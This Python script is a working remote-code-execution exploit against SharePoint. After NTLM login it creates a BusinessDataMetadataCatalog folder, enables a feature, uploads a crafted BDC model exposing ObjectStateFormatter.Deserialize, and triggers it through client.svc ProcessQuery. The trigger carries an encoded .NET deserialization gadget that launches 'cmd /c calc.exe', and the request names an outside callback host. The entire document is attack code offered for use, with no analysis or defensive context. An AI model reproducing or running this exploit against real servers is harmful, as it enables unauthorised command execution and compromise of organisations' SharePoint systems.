# -*- coding: utf-8 -*-

import requests
from requests_ntlm2 import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
# from urllib import quote_plus
import sys, time
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

session = requests.session()
target1 = sys.argv[1]
username = sys.argv[2]
pwd = sys.argv[3]
# cmd = sys.argv[4]
# username = "spuser"
# pwd = "Abcd@@1234"
site = "/my/personal/" + username
target = target1 + site
# cmd = "calc.exe"

print("Target: " + target1)

digest = ""
auth = HttpNtlmAuth('%s' % (username), 
                        pwd)
# auth = {}
PROXY = {}
burp0_url = target1 + "/_api/web/"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False)

if content.status_code == 401:
    print("User is not site owner or wrong creds!")
    burp0_url = target1 + "/my/"
    burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

    content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False, proxies=PROXY)

    print(content.status_code)

    if content.status_code == 401:
        print("Wrong credentials!")
        exit()
else:
    target = target1
    site = ""


time.sleep(5)
# need time to setup the personal site
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)

if content.status_code == 401:
    print("Wrong credentials!")
    exit()

print(burp0_url)
digest = content.headers['X-RequestDigest']

#Create BusinessDataMetadataCatalog folder
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)
# print(content.content)
if content.status_code != 201:
    print("Error while creating folder, folder may be existed")


burp0_url = target + "/_api/web/features/add(guid'5B10D113-2D0D-43BD-A2FD-F8BC879F5ABD')"

burp0_headers = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate", "X-RequestDigest": digest, "Accept": "application/json;odata=verbose", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "If-Modified-Since": "Mon, 30 Jan 2023 14:01:00 GMT", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/json"}
burp0_json={"force": True}
requests.post(burp0_url, headers=burp0_headers,  json=burp0_json, auth=auth, verify=False, proxies=PROXY)

#create bdcm file
burp0_url = target + "/_api/web/GetFolderByServerRelativeUrl('"+site+"/BusinessDataMetadataCatalog/')/Files/add(url='"+site+"/BusinessDataMetadataCatalog/BDCMetadata.bdcm',overwrite=true)"

burp0_headers = {"Connection": "close", "X-RequestDigest": digest, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "python-requests/2.27.1", "Content-type": "application/x-www-form-urlencoded"}
burp0_data = """<?xml version="1.0" encoding="utf-8"?><Model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Name="BDCMetadata" xmlns="http://schemas.microsoft.com/windows/2007/BusinessDataCatalog"><LobSystems><LobSystem Name="QjtvWXFT" Type="DotNetAssembly"><Properties><Property Name="WsdlFetchUrl" Type="System.String">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property><Property Name="Class" Type="System.String">RevertToSelf</Property></Properties><LobSystemInstances><LobSystemInstance Name="QjtvWXFT"></LobSystemInstance></LobSystemInstances><Entities><Entity Name="Products" DefaultDisplayName="Products" Namespace="ODataDemo" Version="1.0.0.0" EstimatedInstanceCount="2000"><Properties><Property Name="ExcludeFromOfflineClientForList" Type="System.String">False</Property>
<Property Name="Class" Type="System.String">System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</Property></Properties><Identifiers><Identifier Name="ID" TypeName="System.String" /></Identifiers><Methods><Method Name="Deserialize" DefaultDisplayName="Create Product" IsStatic="false"><Parameters><Parameter Name="@ID" Direction="In"><TypeDescriptor Name="ID" DefaultDisplayName="ID" TypeName="System.String" IdentifierName="ID" CreatorField="true">
<Properties>

<Property Name="IsOnBehalfOfField" Type="System.Boolean">true</Property>
</Properties>
</TypeDescriptor></Parameter><Parameter Name="@CreateProduct" Direction="Return"><TypeDescriptor Name="CreateProduct" TypeName="System.Object"></TypeDescriptor></Parameter></Parameters><MethodInstances><MethodInstance Name="CreateProduct" Type="EventSubscriber" ReturnParameterName="@CreateProduct"><AccessControlList><AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string"><Right BdcRight="Execute" /></AccessControlEntry></AccessControlList></MethodInstance></MethodInstances></Method></Methods></Entity></Entities></LobSystem></LobSystems></Model>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data,  auth=auth, verify=False, proxies=PROXY)
print(req.status_code)
#Trigger vuln


burp0_url = target + "/_vti_bin/client.svc/ProcessQuery"

burp0_headers = {"X-RequestDigest": digest, "Content-Type": "text/xml", "X-RequestForceAuthentication": "true", "Accept-Encoding": "gzip, deflate", "Expect": "100-continue"}
burp0_data = """<Request AddExpandoFieldTypeSuffix="true" SchemaVersion="15.0.0.0" LibraryVersion="16.0.0.0" ApplicationName=".NET Library" xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009"><Actions><ObjectPath Id="21" ObjectPathId="20" /><ObjectPath Id="23" ObjectPathId="22" /></Actions><ObjectPaths><Method Id="20" ParentId="7" Name="Subscribe"><Parameters><Parameter Type="Int32">1</Parameter>
<Parameter ObjectPathId="17" />
<Parameter Type="String">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</Parameter>
<Parameter Type="String">CreateProduct</Parameter>
<Parameter ObjectPathId="18" />
</Parameters></Method><Property Id="22" ParentId="20" Name="ReturnParameterCollection" /><Identity Id="7" Name="9ccba4bb-d3a8-4255-b87f-18e2d824b848|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo" />
<Identity Id="17" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:notifcallback:avkldkm.c.ultr.cc,CurrentContext" />
<Identity Id="18" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:QjtvWXFT,QjtvWXFT" /></ObjectPaths></Request>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=PROXY)


print("Done!")